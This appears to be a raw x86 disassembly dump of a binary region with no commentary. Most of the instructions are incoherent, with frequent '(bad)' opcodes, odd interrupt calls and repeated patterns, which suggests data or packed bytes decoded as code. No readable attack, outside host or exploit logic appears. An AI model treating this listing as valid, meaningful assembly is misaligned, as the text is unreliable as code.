  427282:	and    bh,BYTE PTR [ebx]
  427284:	(bad)  
  427286:	(bad)  
  427288:	jmp    0x42721c
  42728a:	shr    edx,cl
  42728c:	sub    BYTE PTR [ebx+0x13],dl
  42728f:	retf   0x4d8c
  427292:	push   ebp
  427293:	pusha  
  427294:	jge    0x4272c5
  427296:	push   es
  427297:	cmc    
  427298:	add    BYTE PTR [eax-0x12893280],0xcd
  42729f:	(bad)  
  4272a0:	in     eax,dx
  4272a1:	int    0x89
  4272a3:	int    0x80
  4272a5:	cmp    esi,eax
  4272a7:	shl    edx,cl
  4272a9:	sub    BYTE PTR [ebx],bh
  4272ab:	jns    0x427280
  4272ad:	mov    ebp,0xcad35392
  4272b2:	je     0x427239
  4272b4:	ror    ch,1
  4272b6:	lea    edx,[ecx*8+0x1496cd89]
  4272bd:	int    0x22
  4272bf:	cmp    ecx,DWORD PTR [edi]
  4272c1:	shr    ebx,cl
  4272c3:	xchg   edx,eax
  4272c4:	cmp    ebx,ecx
  4272c6:	shr    edx,cl
  4272c8:	sub    BYTE PTR [ebx+0x13],dl
  4272cb:	retf   0x4d8c
  4272ce:	rol    BYTE PTR [edx-0x2d],1
  4272d1:	int    0x8d
  4272d3:	cmc    
  4272d4:	int    0x89
  4272d6:	int    0x96
  4272d8:	cmc    
  4272d9:	int    0x22
  4272db:	cmp    ecx,DWORD PTR [edi]
  4272dd:	shr    ebx,cl
  4272df:	xchg   edx,eax
  4272e0:	cmp    ebx,ecx
  4272e2:	shr    edx,cl
  4272e4:	sub    BYTE PTR [ebx+0x13],dl
  4272e7:	retf   0x4d8c
  4272ea:	ror    BYTE PTR [edx-0x2d],1
  4272ed:	int    0x8d
  4272ef:	adc    al,0xcd
  4272f1:	mov    ebp,ecx
  4272f3:	xchg   esi,eax
  4272f4:	adc    al,0xcd
  4272f6:	and    bh,BYTE PTR [ebx]
  4272f8:	(bad)  
  4272fa:	(bad)  
  4272fc:	jmp    0x427290
  4272fe:	shr    edx,cl
  427300:	sub    BYTE PTR [ebx+0x13],dl
  427303:	retf   0x4d8c
  427306:	push   ebp
  427307:	pusha  
  427308:	jge    0x427339
  42730a:	push   es
  42730b:	add    DWORD PTR [eax+0x76cd8080],eax
  427311:	in     eax,dx
  427312:	int    0x8d
  427314:	in     eax,dx
  427315:	int    0x89
  427317:	int    0x80
  427319:	cmp    esi,eax
  42731b:	shl    edx,cl
  42731d:	sub    BYTE PTR [ebx],bh
  42731f:	jns    0x4272f4
  427321:	mov    ebp,0xcad35392
  427326:	je     0x4272ad
  427328:	ror    ch,1
  42732a:	(bad)  
  42732b:	cmc    
  42732c:	int    0x89
  42732e:	int    0x96
  427330:	cmc    
  427331:	int    0x22
  427333:	cmp    ecx,DWORD PTR [edi]
  427335:	shr    ebx,cl
  427337:	xchg   edx,eax
  427338:	cmp    ebx,ecx
  42733a:	shr    edx,cl
  42733c:	sub    BYTE PTR [ebx+0x13],dl
  42733f:	retf   0x4d8c
  427342:	rol    BYTE PTR [edx-0x2d],1
  427345:	int    0x8d
  427347:	adc    ebp,ecx
  427349:	mov    ebp,ecx
  42734b:	xchg   esi,eax
  42734c:	adc    ebp,ecx
  42734e:	and    bh,BYTE PTR [ebx]
  427350:	psrlq  mm5,mm3
  427353:	xchg   edx,eax
  427354:	cmp    ebx,ecx
  427356:	shr    edx,cl
  427358:	sub    BYTE PTR [ebx+0x13],dl
  42735b:	retf   0x4d8c
  42735e:	ror    BYTE PTR [edx-0x2d],1
  427361:	int    0x8d
  427363:	in     eax,dx
  427364:	int    0x89
  427366:	int    0x96
  427368:	in     eax,dx
  427369:	int    0x22
  42736b:	cmp    ecx,DWORD PTR [edi]
  42736d:	cmp    ebx,ecx
  42736f:	shr    ebx,cl
  427371:	xchg   edx,eax
  427372:	shr    edx,cl
  427374:	sub    BYTE PTR [ebx+0x13],dl
  427377:	retf   0x4d8c
  42737a:	push   ebp
  42737b:	pusha  
  42737c:	jge    0x427354
  42737e:	xor    bh,cl
  427380:	jbe    0x427352
  427382:	jo     0x427341
  427384:	outs   dx,DWORD PTR ds:[esi]
  427385:	lods   eax,DWORD PTR ds:[esi]
  427386:	add    BYTE PTR [eax],al
  427388:	int    0x8d
  42738a:	pop    ebp
  42738b:	inc    ebx
  42738c:	rcl    esp,cl
  42738e:	push   ss
  42738f:	int    0x76
  427391:	std    
  427392:	int    0x8d
  427394:	std    
  427395:	cmp    esi,eax
  427397:	cmp    edi,DWORD PTR [ecx-0x2d]
  42739a:	repnz sub bl,dl
  42739d:	mov    ebp,0xad35392
  4273a2:	jbe    0x427351
  4273a4:	int    0x76
  4273a6:	stc    
  4273a7:	int    0xa6
  4273a9:	stc    
  4273aa:	int    0x76
  4273ac:	stc    
  4273ad:	int    0x8d
  4273af:	stc    
  4273b0:	cmp    ebp,DWORD PTR [ecx-0x132c36c5]
  4273b6:	xchg   edx,eax
  4273b7:	shr    DWORD PTR [ebp-0x7862acd8],cl
  4273bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4273be:	gs int 0x76
  4273c1:	xchg   ebp,eax
  4273c2:	cmp    ecx,DWORD PTR [edi]
  4273c4:	add    al,0xf2
  4273c6:	std    
  4273c7:	add    al,0xad
  4273c9:	std    
  4273ca:	shr    esp,cl
  4273cc:	sub    BYTE PTR [edi+0x12db537d],al
  4273d2:	hlt    
  4273d3:	dec    ecx
  4273d4:	and    DWORD PTR [esi-0x28932cb],eax
  4273da:	int    0x8d
  4273dc:	std    
  4273dd:	cmp    esi,eax
  4273df:	cmp    edi,DWORD PTR [ecx-0x2d]
  4273e2:	repnz sub bl,dl
  4273e5:	mov    ebp,0xcdd35392
  4273ea:	lea    ebp,[ebp+0x52f7d43]
  4273f0:	push   ds
  4273f1:	std    
  4273f2:	add    BYTE PTR [eax],al
  4273f4:	int    0x76
  4273f6:	std    
  4273f7:	int    0x8d
  4273f9:	std    
  4273fa:	cmp    edi,DWORD PTR [ecx+0x3b]
  4273fd:	lock shl edx,cl
  427400:	sub    bl,dl
  427402:	mov    ebp,0xcdd35392
  427407:	lea    ebp,[ebp+0x1ad67d43]
  42740d:	int    0x76
  42740f:	stc    
  427410:	int    0x8d
  427412:	stc    
  427413:	cmp    edi,DWORD PTR [ecx+0x3b]
  427416:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42741d:	push   ebx
  42741e:	shr    ebx,cl
  427420:	jle    0x4273a3
  427422:	add    BYTE PTR [eax+0x5b6324c0],0x0
  427429:	(bad)  
  42742a:	popf   
  42742b:	iret   
  42742c:	jbe    0x427443
  42742e:	jo     0x4273ed
  427430:	jge    0x42740d
  427432:	add    BYTE PTR [eax],al
  427434:	int    0x76
  427436:	std    
  427437:	int    0x8d
  427439:	std    
  42743a:	cmp    edi,DWORD PTR [ecx+0x3b]
  42743d:	lock shl edx,cl
  427440:	sub    bl,dl
  427442:	mov    ebp,0xcdd35392
  427447:	lea    esp,[ebp+0x5bd4d343]
  42744d:	int    0x76
  42744f:	stc    
  427450:	int    0x8d
  427452:	stc    
  427453:	cmp    edi,DWORD PTR [ecx+0x3b]
  427456:	lock shl edx,cl
  427459:	sub    bl,dl
  42745b:	mov    ebp,0xcdd35392
  427460:	lea    esp,[ebp+0x26d4d343]
  427466:	int    0x76
  427468:	stc    
  427469:	int    0x8d
  42746b:	stc    
  42746c:	cmp    edi,DWORD PTR [ecx+0x3b]
  42746f:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427476:	push   ebx
  427477:	shl    DWORD PTR [eax+0x5b],cl
  42747a:	iret   
  42747b:	jbe    0x427492
  42747d:	jo     0x42743c
  42747f:	das    
  427480:	cli    
  427481:	add    BYTE PTR [eax],al
  427483:	int    0x76
  427485:	std    
  427486:	int    0x8d
  427488:	std    
  427489:	cmp    edi,DWORD PTR [ecx+0x3b]
  42748c:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427493:	push   ebx
  427494:	shl    DWORD PTR [eax+0x5b],cl
  427497:	iret   
  427498:	jbe    0x4274af
  42749a:	jo     0x427459
  42749c:	sti    
  42749d:	stc    
  42749e:	add    BYTE PTR [eax],al
  4274a0:	int    0x76
  4274a2:	popf   
  4274a3:	xchg   ebp,eax
  4274a5:	or     dh,BYTE PTR [esi+0x14]
  4274a8:	add    dh,dl
  4274aa:	cmp    eax,0xcd14d600
  4274af:	jbe    0x4274e6
  4274b1:	xchg   DWORD PTR [esi-0x78],esi
  4274b4:	jo     0x427473
  4274b6:	push   edx
  4274b7:	fild   DWORD PTR [eax]
  4274b9:	add    ch,cl
  4274bb:	jbe    0x4274ba
  4274bd:	int    0x8d
  4274bf:	std    
  4274c0:	cmp    edi,DWORD PTR [ecx+0x3b]
  4274c3:	lock shl edx,cl
  4274c6:	sub    bl,dl
  4274c8:	mov    ebp,0xcdd35392
  4274cd:	lea    esp,[ebp-0x592b2cbd]
  4274d3:	int    0x76
  4274d5:	stc    
  4274d6:	int    0x8d
  4274d8:	stc    
  4274d9:	cmp    edi,DWORD PTR [ecx+0x3b]
  4274dc:	lock shl edx,cl
  4274df:	sub    bl,dl
  4274e1:	mov    ebp,0xcdd35392
  4274e6:	lea    esp,[ebp+0x32d4d343]
  4274ec:	int    0x76
  4274ee:	stc    
  4274ef:	int    0x8d
  4274f1:	stc    
  4274f2:	cmp    edi,DWORD PTR [ecx-0x2d]
  4274f5:	mov    ebp,0xd3f03b92
  4274fa:	repnz sub BYTE PTR [ebx-0x2d],dl
  4274fe:	jo     0x427500
  427500:	(bad)  
  427501:	cmp    eax,0x873576cd
  427506:	jbe    0x427490
  427508:	jo     0x4274c7
  42750a:	add    eax,0xcd0000f9
  42750f:	jbe    0x42750e
  427511:	int    0x8d
  427513:	std    
  427514:	cmp    edi,DWORD PTR [ecx-0x2d]
  427517:	mov    ebp,0xd3f03b92
  42751c:	repnz sub BYTE PTR [ebx-0x2d],dl
  427520:	jo     0x427522
  427522:	(bad)  
  427523:	cmp    eax,0x873576cd
  427528:	jbe    0x4274b2
  42752a:	jo     0x4274e9
  42752c:	jb     0x427527
  42752e:	add    BYTE PTR [eax],al
  427530:	int    0x8d
  427532:	inc    ebp
  427533:	int    0x76
  427535:	inc    ebp
  427536:	cmp    ecx,ecx
  427538:	cmp    ecx,DWORD PTR [edi]
  42753a:	shr    ebx,cl
  42753c:	xchg   edx,eax
  42753d:	shr    DWORD PTR [ebp-0x322cacd8],cl
  427543:	lea    ebp,ds:0x803fd33b
  427549:	add    DWORD PTR [eax+0x3614d480],0x80800180
  427553:	jo     0x427555
  427555:	(bad)  
  427556:	cmp    eax,0x87358dcd
  42755b:	lea    ecx,[eax+0xa95abd]
  427561:	add    ch,cl
  427563:	jbe    0x427595
  427565:	int    0x8d
  427567:	cmp    eax,0x76cd8881
  42756c:	cmp    eax,0xabd7687
  427571:	jbe    0x427530
  427573:	int    0x76
  427575:	stc    
  427576:	int    0x8d
  427578:	stc    
  427579:	cmp    esi,eax
  42757b:	shl    edx,cl
  42757d:	sub    BYTE PTR [ebx],bh
  42757f:	jns    0x427554
  427581:	mov    ebp,0xcdd35392
  427586:	lea    edi,[ebp-0x322c2ed1]
  42758c:	(bad)  
  42758d:	std    
  42758e:	int    0x96
  427590:	std    
  427591:	cmp    ecx,DWORD PTR [edi]
  427593:	cmp    ebx,ecx
  427595:	shr    ebx,cl
  427597:	xchg   edx,eax
  427598:	shr    edx,cl
  42759a:	sub    BYTE PTR [ebx+0x13],dl
  42759d:	xchg   DWORD PTR [ebp+0x2fd343f1],ecx
  4275a3:	or     edi,DWORD PTR [ecx]
  4275a5:	cli    
  4275a6:	add    BYTE PTR [eax],al
  4275a8:	int    0x76
  4275aa:	mov    BYTE PTR [edx-0x2d349c58],ch
  4275b0:	xor    BYTE PTR [eax+0x4edcd96],al
  4275b6:	in     eax,dx
  4275b7:	adc    al,0x5b
  4275b9:	cwde   
  4275ba:	call   0xcd34:0x76cd6d3b
  4275c1:	add    DWORD PTR ds:0xcd808081,ebp
  4275c7:	xchg   esi,eax
  4275c8:	mov    ch,cl
  4275ca:	or     ch,0xd6
  4275cd:	dec    esp
  4275ce:	int    0xe6
  4275d0:	mov    ch,cl
  4275d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275d3:	dec    esp
  4275d4:	or     dh,BYTE PTR [esi-0x3]
  4275d7:	pop    edi
  4275d8:	jnp    0x427611
  4275da:	ficom  WORD PTR [ebx]
  4275dc:	cmp    esp,ebx
  4275de:	pop    ebp
  4275df:	mov    ebp,0x3b25230a
  4275e4:	adc    DWORD PTR [edi],ebp
  4275e6:	inc    ebp
  4275e7:	sti    
  4275e8:	xchg   edx,eax
  4275e9:	shr    ecx,cl
  4275eb:	sub    BYTE PTR [edx],dl
  4275ed:	clc    
  4275ee:	add    BYTE PTR [eax-0x102c9380],0x92
  4275f5:	cmp    ebx,ebp
  4275f7:	push   ebx
  4275f8:	clc    
  4275f9:	int    0xe6
  4275fb:	sbb    al,0x53
  4275fd:	aad    0x43
  4275ff:	(bad)  
  427601:	sbb    eax,DWORD PTR [ebx-0xc]
  427604:	(bad)  
  427605:	das    
  427606:	adc    cl,BYTE PTR [ebp+0x59]
  427609:	je     0x4275b5
  42760b:	push   edi
  42760c:	ja     0x4275d3
  42760e:	xchg   edi,eax
  42760f:	shr    ebx,0xd9
  427612:	add    DWORD PTR [eax+0x3096cd80],0xcd14d6cd
  42761c:	xchg   esi,eax
  42761d:	mov    ch,cl
  42761f:	(bad)  
  427620:	dec    esp
  427621:	int    0x96
  427623:	mov    ch,cl
  427625:	(bad)  
  427626:	dec    esp
  427627:	int    0xe6
  427629:	mov    ch,cl
  42762b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42762c:	dec    esp
  42762d:	cmp    edx,DWORD PTR [ecx]
  42762f:	cmp    esp,ebx
  427631:	das    
  427632:	inc    ebp
  427633:	sti    
  427634:	xchg   edx,eax
  427635:	shr    ecx,cl
  427637:	sub    BYTE PTR [edx],dl
  427639:	clc    
  42763a:	add    BYTE PTR [eax-0x22c49380],0x53
  427641:	aad    0xd3
  427643:	out    dx,eax
  427644:	xchg   edx,eax
  427645:	push   ebx
  427646:	clc    
  427647:	int    0xe6
  427649:	xor    ch,cl
  42764b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42764c:	adc    al,0x3b
  42764e:	popf   
  42764f:	int    0x76
  427651:	xor    BYTE PTR [ebx],bh
  427653:	cli    
  427654:	int    0x8d
  427656:	adc    al,0x2f
  427658:	inc    ebp
  427659:	loope  0x4275ed
  42765b:	shr    DWORD PTR [ebp+0x53cb3b28],cl
  427661:	cli    
  427662:	push   esi
  427663:	add    BYTE PTR [eax-0x132c9380],0x92
  42766a:	push   ebx
  42766b:	popf   
  42766c:	int    0x76
  42766e:	mov    BYTE PTR [edi-0x320be427],al
  427674:	bswap  ebp
  427676:	(bad)  
  427677:	dec    esp
  427678:	int    0xe6
  42767a:	xor    ch,cl
  42767c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42767d:	adc    al,0x4
  42767f:	lods   eax,DWORD PTR ds:[esi]
  427680:	std    
  427681:	add    al,0xe9
  427683:	std    
  427684:	shr    ebx,cl
  427686:	sub    BYTE PTR [ebx],bh
  427688:	ficom  DWORD PTR [esi-0x2c]
  42768b:	aaa    
  42768c:	ficom  WORD PTR [ebx]
  42768e:	adc    dh,bh
  427690:	mov    ebp,0x1225230a
  427695:	clc    
  427696:	aam    0x37
  427698:	ficom  WORD PTR [ebx]
  42769a:	adc    dh,ah
  42769c:	mov    ebp,0x8725230a
  4276a1:	leave  
  4276a2:	sbb    esi,esp
  4276a4:	push   ebx
  4276a5:	jge    0x4276fa
  4276a7:	cdq    
  4276a8:	pop    ebp
  4276a9:	mov    ebp,0x1225230a
  4276ae:	add    dl,dh
  4276b0:	aaa    
  4276b1:	ficom  WORD PTR [ebx]
  4276b3:	cmp    esi,ecx
  4276b5:	adc    bh,dl
  4276b7:	out    0x37,al
  4276b9:	ficom  WORD PTR [ebx]
  4276bb:	(bad)  
  4276bc:	sbb    eax,DWORD PTR [ebx-0xf]
  4276bf:	(bad)  
  4276c0:	das    
  4276c1:	adc    dl,BYTE PTR [esi-0x1]
  4276c4:	das    
  4276c5:	stos   DWORD PTR es:[edi],eax
  4276c6:	push   es
  4276c7:	in     eax,0x9b
  4276c9:	xchg   edi,eax
  4276ca:	imul   bl
  4276cc:	and    al,0x81
  4276ce:	add    BYTE PTR [eax-0x32776933],0xd6
  4276d5:	dec    esp
  4276d6:	int    0xa6
  4276d8:	mov    ch,cl
  4276da:	out    0x4c,al
  4276dc:	cmp    edx,DWORD PTR [ecx]
  4276de:	pop    edi
  4276df:	jnp    0x427718
  4276e1:	ficom  WORD PTR [ebx]
  4276e3:	cmp    esp,ebx
  4276e5:	das    
  4276e6:	inc    ebp
  4276e7:	sti    
  4276e8:	xchg   edx,eax
  4276e9:	shr    edi,cl
  4276eb:	xchg   edx,eax
  4276ec:	cmp    eax,DWORD PTR [eax]
  4276ee:	shl    ebp,cl
  4276f0:	sub    BYTE PTR [edx],cl
  4276f2:	(bad)  
  4276f3:	cmc    
  4276f4:	push   ebx
  4276f5:	fxch   st(5)
  4276f7:	out    0xf5,al
  4276f9:	imul   eax,DWORD PTR [eax+0x3b6c8080],0xcdfc53a9
  427703:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427704:	and    al,0xcd
  427706:	and    ecx,DWORD PTR [edx]
  427708:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427709:	adc    DWORD PTR [ebx-0x1e],eax
  42770c:	(bad)  
  42770d:	xchg   BYTE PTR [ebx],bh
  42770f:	fiadd  DWORD PTR [ebx-0x27]
  427712:	aam    0x20
  427714:	add    dh,dl
  427716:	xor    al,0xcd
  427718:	(bad)  
  427719:	and    al,0x0
  42771b:	(bad)  
  42771c:	sub    al,0x0
  42771e:	(bad)  
  42771f:	std    
  427720:	add    BYTE PTR [eax-0x43],bl
  427723:	sub    edi,eax
  427725:	add    BYTE PTR [eax],al
  427727:	or     al,BYTE PTR [esi-0x7f7f9615]
  42772d:	or     ch,0x96
  427730:	mov    ch,cl
  427732:	out    0x4c,al
  427734:	cmp    edi,ecx
  427736:	cmp    esp,ebx
  427738:	das    
  427739:	inc    ebp
  42773a:	add    edx,DWORD PTR [edx+0xa9210d3]
  427740:	out    0xf5,al
  427742:	int    0xe6
  427744:	mov    ch,cl
  427746:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427747:	dec    esp
  427748:	shr    ecx,cl
  42774a:	sub    BYTE PTR [ebx],bh
  42774c:	dec    ebp
  42774e:	(bad)  
  42774f:	cmc    
  427750:	cmp    ebx,ebp
  427752:	push   ebx
  427753:	clc    
  427754:	int    0xe6
  427756:	xor    BYTE PTR [ebx],bh
  427758:	cli    
  427759:	push   ebx
  42775a:	aad    0xcd
  42775c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42775d:	adc    al,0x3b
  42775f:	popf   
  427760:	int    0xc9
  427762:	int    0xe6
  427764:	xor    ch,cl
  427766:	or     al,0xcd
  427768:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427769:	adc    al,0x2f
  42776b:	inc    ebp
  42776c:	jge    0x427700
  42776e:	shr    ecx,cl
  427770:	sub    BYTE PTR [ebx],bh
  427772:	fst    st(3)
  427774:	jmp    0x427708
  427776:	adc    bh,al
  427778:	add    BYTE PTR [eax-0x3aac9380],0x53
  42777f:	lock inc ebx
  427781:	icebp  
  427782:	(bad)  
  427783:	sbb    BYTE PTR [ebx+0x2],al
  427786:	(bad)  
  427787:	and    dh,BYTE PTR [ecx+0x761dfc3b]
  42778d:	mov    esi,0xdd8bf56d
  427792:	(bad)  
  427793:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427794:	cmp    edi,esp
  427796:	sbb    eax,0xcd62ec76
  42779b:	jbe    0x427725
  42779d:	int    0x8d
  42779f:	dec    esp
  4277a0:	int    0x96
  4277a2:	mov    ch,cl
  4277a4:	(bad)  
  4277a5:	dec    esp
  4277a6:	adc    al,BYTE PTR [edx]
  4277a8:	mov    ebp,0x5625230a
  4277ad:	jnp    0x4277e6
  4277af:	ficom  WORD PTR [ebx]
  4277b1:	das    
  4277b2:	inc    ebp
  4277b3:	jge    0x427747
  4277b5:	int    0xfb
  4277b7:	cmp    eax,DWORD PTR [eax]
  4277b9:	cmp    ebx,edx
  4277bb:	sar    DWORD PTR [ecx-0x2cfcc4d8],cl
  4277c1:	jmp    0x427755
  4277c3:	adc    dh,bh
  4277c5:	add    BYTE PTR [eax-0x36ac9380],0x53
  4277cc:	divps  xmm6,XMMWORD PTR [esi-0x3]
  4277d0:	(bad)  
  4277d1:	test   BYTE PTR [ebx-0x1d],al
  4277d4:	aam    0x4c
  4277d6:	adc    al,BYTE PTR [esi-0x3e]
  4277d9:	gs sub al,0x1
  4277dc:	jo     0x427818
  4277de:	mov    edx,0x124aece0
  4277e3:	ss inc edx
  4277e5:	das    
  4277e6:	sbb    edx,esi
  4277e8:	mov    ebx,0xaa029f75
  4277ed:	test   al,0x63
  4277ef:	retf   
  4277f0:	shr    BYTE PTR [eax+eax*4],cl
  4277f3:	xchg   esi,eax
  4277f4:	int    0xed
  4277f6:	add    al,0xed
  4277f8:	dec    esp
  4277f9:	int    0x76
  4277fb:	mov    ch,cl
  4277fd:	lea    ecx,[edi+ebp*1+0x45]
  427801:	jge    0x427795
  427803:	shr    ebx,cl
  427805:	xchg   edx,eax
  427806:	int    0x8d
  427808:	mov    ch,cl
  42780a:	xchg   esi,eax
  42780b:	dec    esp
  42780c:	cwde   
  42780d:	shl    edx,cl
  42780f:	sub    ch,cl
  427811:	lea    ebx,[ecx+ebp*2]
  427814:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427815:	mov    esi,0x793b4229
  42781a:	cmp    ebx,edx
  42781c:	push   ebx
  42781d:	ror    BYTE PTR [edx],cl
  42781f:	or     ebp,0x1cd2476
  427825:	xor    eax,0xcd808081
  42782a:	mov    ch,cl
  42782c:	jbe    0x427852
  42782e:	int    0x1
  427830:	xor    eax,0xcd808081
  427835:	add    BYTE PTR [edi-0x72329b92],0x24
  42783c:	int    0xa
  42783e:	adc    DWORD PTR [ecx+0x7ecd8080],eax
  427844:	adc    al,0xc0
  427846:	test   BYTE PTR [eax+eax*4+0x808050],bh
  42784d:	nop
  42784e:	jo     0x4278b2
  427850:	add    bl,ah
  427852:	or     cl,BYTE PTR [ebx-0x32778933]
  427858:	lea    ecx,[edi+ebp*1+0x45]
  42785c:	jge    0x4277f0
  42785e:	shr    ebx,cl
  427860:	xchg   edx,eax
  427861:	int    0x8d
  427863:	mov    ch,cl
  427865:	xchg   esi,eax
  427866:	dec    esp
  427867:	add    dh,dl
  427869:	and    al,0x3b
  42786b:	jns    0x4278a8
  42786d:	ficom  DWORD PTR [ebx-0x2e]
  427870:	or     dh,BYTE PTR [esi-0x3]
  427873:	iret   
  427874:	jbe    0x427873
  427876:	jo     0x427812
  427878:	add    dh,dl
  42787a:	sbb    al,0xd3
  42787c:	repnz sub BYTE PTR [eax],al
  42787f:	(bad)  
  427880:	adc    al,0x0
  427882:	(bad)  
  427883:	xor    BYTE PTR [eax],al
  427885:	(bad)  
  427886:	dec    esp
  427887:	add    dh,dl
  427889:	mov    BYTE PTR [ebp+0xfe2b],bh
  42788f:	int    0x76
  427891:	mov    ch,cl
  427893:	lea    ecx,[edi+ebp*1+0x45]
  427897:	jge    0x42782b
  427899:	shr    ebx,cl
  42789b:	xchg   edx,eax
  42789c:	int    0x8d
  42789e:	mov    ch,cl
  4278a0:	xchg   esi,eax
  4278a1:	dec    esp
  4278a2:	cmp    edi,DWORD PTR [ecx+0x3b]
  4278a5:	fcmovbe st,st(3)
  4278a7:	repnz sub ch,cl
  4278aa:	das    
  4278ab:	push   ebx
  4278ac:	rol    BYTE PTR [ebx+0x7d],cl
  4278af:	aam    0x36
  4278b1:	int    0x76
  4278b3:	xor    ch,cl
  4278b5:	lea    edx,[edi+ebp*1]
  4278b8:	inc    ebp
  4278b9:	jge    0x42784d
  4278bb:	shr    ebx,cl
  4278bd:	xchg   edx,eax
  4278be:	int    0x8d
  4278c0:	xor    ch,cl
  4278c2:	xchg   esi,eax
  4278c3:	adc    al,0x3b
  4278c5:	jns    0x427902
  4278c7:	fcmovbe st,st(3)
  4278c9:	repnz sub ch,cl
  4278cc:	lea    ebx,[ebx+edx*2]
  4278cf:	shr    BYTE PTR [edi],cl
  4278d1:	shl    DWORD PTR [esi-0x3],1
  4278d4:	or     al,BYTE PTR [ecx+0x1cd2cba8]
  4278da:	adc    BYTE PTR [esi+0x5b71edcd],0x98
  4278e1:	call   0xcd3c:0xd6cd6d3b
  4278e8:	xchg   esi,eax
  4278e9:	inc    esp
  4278ea:	int    0xe6
  4278ec:	and    al,0x5d
  4278ee:	mov    ebp,0x5f25230a
  4278f3:	jnp    0x42792c
  4278f5:	ficom  WORD PTR [ebx]
  4278f7:	inc    ebx
  4278f8:	icebp  
  4278f9:	das    
  4278fa:	or     BYTE PTR [edi],al
  4278fc:	add    BYTE PTR [eax-0x4613080],0x82
  427903:	test   BYTE PTR [ebx-0xc],al
  427906:	jnp    0x4278ee
  427908:	inc    ebx
  427909:	hlt    
  42790a:	(bad)  
  42790b:	mov    BYTE PTR [ebx-0xf],al
  42790e:	das    
  42790f:	add    eax,0x80809216
  427914:	adc    bh,bh
  427916:	jno    0x42794f
  427918:	ficom  WORD PTR [ebx]
  42791a:	(bad)  
  42791b:	mov    BYTE PTR [ebx-0xf],al
  42791e:	das    
  42791f:	add    eax,0x80809285
  427924:	adc    bh,bh
  427926:	xchg   esi,eax
  427927:	aaa    
  427928:	ficom  WORD PTR [ebx]
  42792a:	(bad)  
  42792b:	mov    BYTE PTR [ebx-0xf],al
  42792e:	das    
  42792f:	add    eax,0x808080f8
  427934:	adc    bh,bh
  427936:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427937:	aaa    
  427938:	ficom  WORD PTR [ebx]
  42793a:	(bad)  
  42793b:	test   BYTE PTR [ebx-0xf],al
  42793e:	aam    0x3e
  427940:	adc    bh,bh
  427942:	scas   al,BYTE PTR es:[edi]
  427943:	aaa    
  427944:	ficom  WORD PTR [ebx]
  427946:	(bad)  
  427947:	mov    BYTE PTR [ebx-0xf],al
  42794a:	das    
  42794b:	add    eax,0x808081db
  427950:	adc    bh,bh
  427952:	mov    dh,0x37
  427954:	ficom  WORD PTR [ebx]
  427956:	das    
  427957:	push   es
  427958:	into   
  427959:	add    DWORD PTR [eax+0x2ff14380],0x80809f05
  427963:	sub    bl,0x12
  427966:	add    DWORD PTR [eax+0x1cd60080],0x2cd600
  427970:	(bad)  
  427971:	adc    al,0x0
  427973:	(bad)  
  427974:	xor    BYTE PTR [eax],al
  427976:	(bad)  
  427977:	dec    esp
  427978:	add    dh,dl
  42797a:	mov    BYTE PTR [ebp+0xff77],bh
  427980:	jmp    0x427938
  427982:	add    DWORD PTR [eax-0x3900ed80],0xd613de37
  42798c:	mov    BYTE PTR [ebx-0xf],al
  42798f:	das    
  427990:	add    eax,0x80808019
  427995:	adc    bh,bh
  427997:	xchg   ecx,eax
  427998:	aaa    
  427999:	ficom  WORD PTR [ebx]
  42799b:	(bad)  
  42799c:	mov    BYTE PTR [ebx-0xf],al
  42799f:	das    
  4279a0:	add    eax,0x8080818e
  4279a5:	adc    bh,bh
  4279a7:	(bad)  
  4279a8:	aaa    
  4279a9:	ficom  WORD PTR [ebx]
  4279ab:	(bad)  
  4279ac:	test   BYTE PTR [ebx-0xf],al
  4279af:	aam    0x1c
  4279b1:	adc    bh,bh
  4279b3:	fidiv  WORD PTR [edi]
  4279b5:	ficom  WORD PTR [ebx]
  4279b7:	(bad)  
  4279b8:	mov    BYTE PTR [ebx-0xf],al
  4279bb:	das    
  4279bc:	add    eax,0x80808142
  4279c1:	adc    bh,bh
  4279c3:	out    0x37,al
  4279c5:	ficom  WORD PTR [ebx]
  4279c7:	in     al,dx
  4279c8:	iret   
  4279c9:	int    0x96
  4279cb:	mov    ch,cl
  4279cd:	(bad)  
  4279ce:	dec    esp
  4279cf:	int    0xe6
  4279d1:	mov    ch,cl
  4279d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279d4:	dec    esp
  4279d5:	cmp    edx,DWORD PTR [ecx]
  4279d7:	cmp    esp,ebx
  4279d9:	das    
  4279da:	inc    ebp
  4279db:	sti    
  4279dc:	xchg   edx,eax
  4279dd:	shr    ecx,cl
  4279df:	sub    BYTE PTR [edx],dl
  4279e1:	clc    
  4279e2:	add    BYTE PTR [eax-0x102c9380],0x92
  4279e9:	cmp    ebx,ebp
  4279eb:	push   ebx
  4279ec:	clc    
  4279ed:	int    0xe6
  4279ef:	mov    BYTE PTR [ebx-0x2b],dl
  4279f2:	int    0xa6
  4279f4:	dec    esp
  4279f5:	xchg   ecx,ebx
  4279f7:	sbb    esi,esp
  4279f9:	or     dl,BYTE PTR [esi+0x4cd60a88]
  4279ff:	int    0x96
  427a01:	mov    ch,cl
  427a03:	(bad)  
  427a04:	dec    esp
  427a05:	int    0xe6
  427a07:	mov    ch,cl
  427a09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a0a:	dec    esp
  427a0b:	cmp    edx,DWORD PTR [ecx]
  427a0d:	cmp    esp,ebx
  427a0f:	das    
  427a10:	inc    ebp
  427a11:	sti    
  427a12:	xchg   edx,eax
  427a13:	shr    ecx,cl
  427a15:	sub    BYTE PTR [ebx],bh
  427a17:	fst    st(3)
  427a19:	out    dx,eax
